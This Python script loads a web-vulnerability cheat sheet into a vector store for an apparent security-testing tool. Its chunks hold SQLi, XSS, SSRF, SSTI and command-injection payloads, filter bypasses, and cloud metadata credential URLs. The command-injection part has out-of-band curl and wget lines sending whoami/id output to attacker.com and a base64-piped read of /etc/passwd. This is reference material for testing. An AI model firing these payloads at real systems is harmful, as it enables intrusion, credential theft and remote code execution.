#!/usr/bin/env python3
"""
Ingest core security knowledge into RAG.
Creates foundational chunks for common vulnerabilities.
"""
from ghost_hunter.core.rag.vector_store import VectorStoreManager
from ghost_hunter.core.rag.contracts import Chunk
from datetime import datetime

CORE_KNOWLEDGE = [
    # SQL Injection
    {
        "id": "sqli_basics",
        "vuln_type": "sqli",
        "text": """# SQL Injection Fundamentals

SQL Injection occurs when user input is concatenated into SQL queries without proper sanitization.

## Detection Techniques
- Single quote test: `'` - look for SQL errors
- Boolean-based: `' OR '1'='1` vs `' OR '1'='2`
- Time-based: `' AND SLEEP(5)--`
- Union-based: `' UNION SELECT NULL--`
- Error-based: `' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`

## Common Injection Points
- GET/POST parameters
- HTTP Headers (User-Agent, Referer, X-Forwarded-For)
- Cookies
- JSON/XML body fields

## Database-Specific Payloads
### MySQL
- Version: `SELECT @@version`
- Users: `SELECT user FROM mysql.user`
- Tables: `SELECT table_name FROM information_schema.tables`

### PostgreSQL
- Version: `SELECT version()`
- Tables: `SELECT tablename FROM pg_tables`

### MSSQL
- Version: `SELECT @@VERSION`
- Tables: `SELECT name FROM sysobjects WHERE xtype='U'`

## Bypass Techniques
- Case variation: `UnIoN SeLeCt`
- Comments: `UN/**/ION`
- URL encoding: `%27%20OR%20%271%27=%271`
- Double URL encoding
"""
    },
    # XSS
    {
        "id": "xss_basics",
        "vuln_type": "xss",
        "text": """# Cross-Site Scripting (XSS) Fundamentals

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

## Types
1. **Reflected XSS**: Payload in URL, reflected in response
2. **Stored XSS**: Payload stored in database, executed when viewed
3. **DOM XSS**: Payload processed by JavaScript, never sent to server

## Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
```

## Context-Specific Payloads
### Inside HTML tag
```html
"><script>alert(1)</script>
" onfocus=alert(1) autofocus="
```

### Inside JavaScript string
```javascript
'-alert(1)-'
';alert(1)//
</script><script>alert(1)</script>
```

### Inside JavaScript template literal
```javascript
${alert(1)}
```

## Filter Bypass
- Case mixing: `<ScRiPt>`
- Encoding: `&#x3C;script&#x3E;`
- Double encoding
- Null bytes: `<scr%00ipt>`
- Alternative tags: `<svg>`, `<img>`, `<body>`
"""
    },
    # IDOR
    {
        "id": "idor_basics",
        "vuln_type": "idor",
        "text": """# Insecure Direct Object Reference (IDOR)

IDOR occurs when an application exposes internal object references without proper authorization checks.

## Common Patterns
- `/api/users/123` → Change to `/api/users/124`
- `/api/orders?id=1001` → Try id=1002
- `/download?file=report_123.pdf` → Try report_124.pdf
- `/api/v1/account/profile` with `user_id` in body

## Testing Methodology
1. Identify endpoints with object references (IDs, UUIDs, filenames)
2. Create two accounts with different privileges
3. Access Object A with User B's session
4. Check if authorization is enforced

## ID Types to Test
- Sequential integers: 1, 2, 3...
- UUIDs: Try other user's UUIDs
- Encoded IDs: Base64, hashed values
- Composite keys: `org_id + user_id`

## High-Impact IDOR Locations
- User profile endpoints
- Document/file downloads
- Payment/invoice APIs
- Admin functions
- Password reset tokens
- API keys management

## Bypass Techniques
- Parameter pollution: `?id=123&id=456`
- HTTP method change: GET → POST
- Version downgrade: `/v2/` → `/v1/`
- Wrapper bypass: `{"id": "456"}` vs `{"id": 456}`
"""
    },
    # SSRF
    {
        "id": "ssrf_basics",
        "vuln_type": "ssrf",
        "text": """# Server-Side Request Forgery (SSRF)

SSRF allows attackers to make the server perform requests to arbitrary destinations.

## Common Injection Points
- URL parameters: `?url=`, `?path=`, `?src=`
- Webhook URLs
- PDF generators
- Import/export features
- Proxy configurations

## Basic Payloads
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://169.254.169.254  # AWS metadata
```

## Cloud Metadata Endpoints
### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
```

### Azure
```
http://169.254.169.254/metadata/instance
```

## Bypass Techniques
- Decimal IP: `http://2130706433` (127.0.0.1)
- Octal: `http://0177.0.0.1`
- IPv6: `http://[::ffff:127.0.0.1]`
- URL encoding
- DNS rebinding
- Open redirects
"""
    },
    # Authentication
    {
        "id": "auth_basics",
        "vuln_type": "authentication",
        "text": """# Authentication Vulnerabilities

## Common Issues
1. Weak password policies
2. Missing brute-force protection
3. Predictable password reset tokens
4. Session fixation
5. JWT vulnerabilities

## JWT Attacks
### Algorithm Confusion
Change `alg: RS256` to `alg: HS256` and sign with public key

### None Algorithm
```json
{"alg": "none", "typ": "JWT"}
```

### Key Injection
```json
{"alg": "HS256", "jwk": {"k": "..."}}
```

## Password Reset Flaws
- Predictable tokens
- Token not invalidated after use
- Host header injection
- Token leaked in Referer
- Rate limiting bypass

## Session Management
- Session ID in URL
- Missing secure/httponly flags
- Long session timeout
- No re-authentication for sensitive ops

## OAuth Misconfigurations
- Open redirect in redirect_uri
- State parameter missing/predictable
- Scope escalation
- Token leakage
"""
    },
    # Command Injection
    {
        "id": "cmdi_basics",
        "vuln_type": "cmdi",
        "text": """# Command Injection

Command injection allows attackers to execute arbitrary OS commands on the server.

## Basic Payloads
```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
```

## Blind Detection
```bash
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

## Out-of-Band Detection
```bash
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com
; wget http://attacker.com/?x=$(id|base64)
```

## Common Vulnerable Functions
- PHP: system(), exec(), passthru(), shell_exec()
- Python: os.system(), subprocess.call()
- Ruby: system(), exec(), `backticks`
- Node.js: child_process.exec()

## Bypass Techniques
- IFS substitution: `${IFS}`
- Variable expansion: `c$@at /etc/passwd`
- Wildcards: `/???/??t /???/p??s??`
- Hex encoding
- Base64: `echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash`
"""
    },
    # SSTI
    {
        "id": "ssti_basics",
        "vuln_type": "ssti",
        "text": """# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into template engines unsafely.

## Detection Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

## Engine-Specific Payloads

### Jinja2 (Python)
```python
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```java
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
```

### ERB (Ruby)
```ruby
<%= system("id") %>
```

## Identification
1. Inject mathematical expression: `{{7*7}}`
2. If 49 appears, template injection exists
3. Identify engine by error messages or specific syntax
4. Escalate to RCE
"""
    },
    # API Security
    {
        "id": "api_security",
        "vuln_type": "api",
        "text": """# API Security Testing

## Common API Vulnerabilities
1. Broken Object Level Authorization (BOLA/IDOR)
2. Broken Authentication
3. Excessive Data Exposure
4. Lack of Resources & Rate Limiting
5. Broken Function Level Authorization
6. Mass Assignment
7. Security Misconfiguration
8. Injection
9. Improper Assets Management
10. Insufficient Logging

## Enumeration Techniques
- Increment IDs in responses
- Check for hidden endpoints in JS files
- Test HTTP methods: GET, POST, PUT, DELETE, PATCH
- Version testing: /v1/, /v2/, /v3/

## Mass Assignment
Send unexpected fields in requests:
```json
{"name": "test", "role": "admin", "is_admin": true}
```

## Rate Limiting Bypass
- Add X-Forwarded-For header
- Change User-Agent
- Use different API versions
- Add null bytes in parameters

## GraphQL Specific
- Introspection query
- Batching attacks
- Nested query DoS
- Field suggestion disclosure
"""
    },
]

def main():
    print("=== Ingesting Core Security Knowledge ===")
    
    store = VectorStoreManager()
    chunks = []
    
    for item in CORE_KNOWLEDGE:
        chunk = Chunk(
            id=f"core_{item['id']}",
            text=item['text'],
            metadata={
                'source': 'core_knowledge',
                'type': 'fundamentals',
                'vuln_type': item['vuln_type'],
                'indexed_at': datetime.now().isoformat()
            }
        )
        chunks.append(chunk)
        print(f"  - {item['id']}: {len(item['text'])} chars")
    
    print(f"\nUpserting {len(chunks)} chunks...")
    store.upsert(chunks)
    print(f"✅ Total in store: {store.count()}")

if __name__ == '__main__':
    main()
